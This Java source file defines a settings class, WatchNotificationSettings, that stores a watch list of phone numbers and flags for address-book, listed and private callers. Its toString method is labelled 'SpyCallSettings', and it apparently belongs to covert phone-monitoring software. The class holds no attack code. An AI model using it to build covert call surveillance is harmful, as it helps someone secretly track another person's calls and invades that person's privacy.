package com.fx.maind.ref;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;

import com.vvt.logger.FxLog;


public class WatchNotificationSettings implements Serializable{
	
	private static final long serialVersionUID = -4026855609447797454L;
	private static final boolean DEBUG = true;
	/*private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;*/
	private static final boolean LOGE = Customization.ERROR ? DEBUG : false;
	private static final String TAG = "WatchNotificationSettings";
	
	public enum WatchFlag {
		WATCH_IN_ADDRESSBOOK, WATCH_NOT_IN_ADDRESSBOOK, WATCH_IN_LIST, WATCH_PRIVATE_OR_UNKNOWN_NUMBER
	}
	
	private List<String> mWatchNumberList;
	private Map<WatchFlag, Boolean> mWatchFlagMap ;
	private boolean mEnableWatchNotification;
	
	public WatchNotificationSettings() {
		mWatchNumberList = new ArrayList<String>();
		mWatchFlagMap = new HashMap<WatchNotificationSettings.WatchFlag, Boolean>();
	}

	public boolean getEnableWatchNotification() {
		return mEnableWatchNotification;
	}

	public void setEnableWatchNotification(boolean isEnabled) {
		mEnableWatchNotification = isEnabled;
	}
	
	public void AddWatchListNumber(String number) {
		mWatchNumberList.add(number);
	}
	
	public void AddWatchListNumber(List<String> numbers) {
		mWatchNumberList.addAll(numbers);
	}
	
	public List<String> GetWatchListNumbers() {
		return mWatchNumberList;
	}

	public void addWatchFlag(WatchFlag flag, boolean isEnable) {
		try {
			mWatchFlagMap.put(flag, isEnable);
		}catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.getMessage(), e);
		}
	}
	
	public Set<WatchFlag> getWatchFlag() {
		Set<Entry<WatchFlag, Boolean>> set = mWatchFlagMap.entrySet();
		
		Iterator<Entry<WatchFlag, Boolean>> i = set.iterator(); 
	    Set<WatchFlag> result = new LinkedHashSet<WatchFlag>();
		while(i.hasNext()) {
			Map.Entry<WatchFlag, Boolean> me = (Map.Entry<WatchFlag, Boolean>)i.next();
			if(me.getValue() == true) {
				result.add(me.getKey());
			}
		} 
		
		return result;
	}
	
	@Override
	public String toString() {
		StringBuilder builder = new StringBuilder();
		builder.append("SpyCallSettings {");
		builder.append(" WatchNumberList size =").append(mWatchNumberList.size());
		builder.append(" WatchFlagMap =").append(mWatchFlagMap.toString());
		return builder.append(" }").toString();		
	}
}
